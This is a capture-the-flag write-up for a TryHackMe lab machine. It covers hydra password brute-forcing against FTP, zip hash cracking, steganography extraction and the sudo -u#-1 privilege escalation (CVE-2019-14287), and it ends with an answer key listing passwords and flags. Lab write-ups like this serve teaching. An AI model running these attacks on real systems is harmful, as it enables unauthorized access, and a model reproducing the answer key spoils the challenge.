# Task 1 Author note
----

>>Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

>>If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

----

# Task 2 Enumerate
----

>>Enumerate the machine and get all the important information

```bash
root@ip-10-10-112-173:~# nmap -sC -sV 10.10.179.66

Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-04 05:56 GMT
Nmap scan report for ip-10-10-190-153.eu-west-1.compute.internal (10.10.190.153)
Host is up (0.071s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
MAC Address: 02:85:3E:C0:BA:67 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.94 seconds

Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R 

root@ip-10-10-112-173:~# curl -A "C" -L http://10.10.190.153
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 
```

----

# Task 3 Hash cracking and brute-force

>>Done enumerate the machine? Time to brute your way out.

```bash
root@ip-10-10-112-173:~# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.179.66
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-01-04 06:38:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.190.153:21/
[21][ftp] host: 10.10.190.153   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-01-04 06:39:05

root@ip-10-10-112-173:~# ftp 10.10.179.66
Connected to 10.10.179.66.
220 (vsFTPd 3.0.3)
Name (10.10.190.153:root): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> get To_agentJ.txt
local: To_agentJ.txt remote: To_agentJ.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (109.5163 kB/s)
ftp> get cute-alien.jpg
local: cute-alien.jpg remote: cute-alien.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.00 secs (27.4610 MB/s)
ftp> get cutie.png
local: cutie.png remote: cutie.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.00 secs (32.5764 MB/s)

root@ip-10-10-50-122:~# cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
From,
Agent C
```

```bash
root@ip-10-10-50-122:~# binwalk -e cutie.png

root@ip-10-10-50-122:~# zip2john _cutie.png.extracted/8702.zip
8702.zip/To_agentR.txt:$zip2$*0*1*0*4673cae714579045*67aa*4e*61c4cf3af94e649f827e5964ce575c5f7a239c48fb992c8ea8cbffe51d03755e0ca861a5a3dcbabfa618784b85075f0ef476c6da8261805bd0a4309db38835ad32613e3dc5d7e87c0f91c0b5e64e*4969f382486cb6767ae6*$/zip2$:To_agentR.txt:8702.zip:_cutie.png.extracted/8702.zip

root@ip-10-10-50-122:~# john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt
Warning: detected hash type "ZIP", but the string is also recognized as "ZIP-opencl"
Use the "--format=ZIP-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE (2021-03-19 17:52) 2.173g/s 53426p/s 53426c/s 53426C/s chatty..280690
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@ip-10-10-50-122:~# 7z x _cutie.png.extracted/8702.zip
root@ip-10-10-50-122:~# cat To_agentR.txt
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R

root@ip-10-10-50-122:~# printf %s 'QXJlYTUx' | base64 -d
Area51

root@ip-10-10-50-122:~# steghide info cute-alien.jpg 
"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
root@ip-10-10-50-122:~# steghide extract -sf cute-alien.jpg 
Enter passphrase: 
wrote extracted data to "message.txt".
root@ip-10-10-50-122:~# ls
cute-alien.jpg  Desktop    Instructions  Pictures  Rooms    thinclient_drives  Tools
cutie.png       Downloads  message.txt   Postman   Scripts  To_agentJ.txt
root@ip-10-10-50-122:~# cat message.txt 
Hi james,

Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

```

----

# Task 4 Capture the user flag
----

>>You know the drill.

```bash
root@ip-10-10-50-122:~# ssh james@10.10.179.66
The authenticity of host '10.10.179.66 (10.10.179.66)' can't be established.
ECDSA key fingerprint is SHA256:yr7mJyy+j1G257OVtst3Zkl+zFQw8ZIBRmfLi7fX/D8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.179.66' (ECDSA) to the list of known hosts.
james@10.10.179.66's password: 

Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
james@agent-sudo:~$ ls
Alien_autospy.jpg  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b03d975e8c92a7c04146cfa7a5a313c7

root@ip-10-10-50-122:~# scp james@10.10.179.66:/home/james/Alien_autospy.jpg .
james@10.10.179.66's password: 
Alien_autospy.jpg                             100%   41KB  17.1MB/s   00:00 

james@agent-sudo:~$ sudo -l 
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```

----

# Task 5 Privilege escalation
----

>>Enough with the extraordinary stuff? Time to get real.

```bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# ls
Alien_autospy.jpg  user_flag.txt
root@agent-sudo:~# cd /
root@agent-sudo:/# ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
root@agent-sudo:/# cd root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R

```

----

# ANSWER THE FOLLOWING
----

1.Deploy the machine
>>No answer needed

2.How many open ports?
>>3

3.How you redirect yourself to a secret page?
>>user-agent

4.What is the agent name?
>>chris

5.FTP password
>>crystal

6.Zip file password
>>alien

7.steg password
>>Area51

8.Who is the other agent (in full name)?
>>james

9.SSH password
>>hackerrules!

10.What is the user flag?
>>b03d975e8c92a7c04146cfa7a5a313c7

11.What is the incident of the photo called?
>>Roswell alien autopsy

12.CVE number for the escalation 
(Format: CVE-xxxx-xxxx)
>>CVE-2019-14287

13.What is the root flag?
>>b53a02f55b57d4439e3341834d70c062

14.(Bonus) Who is Agent R?
>>DesKel

----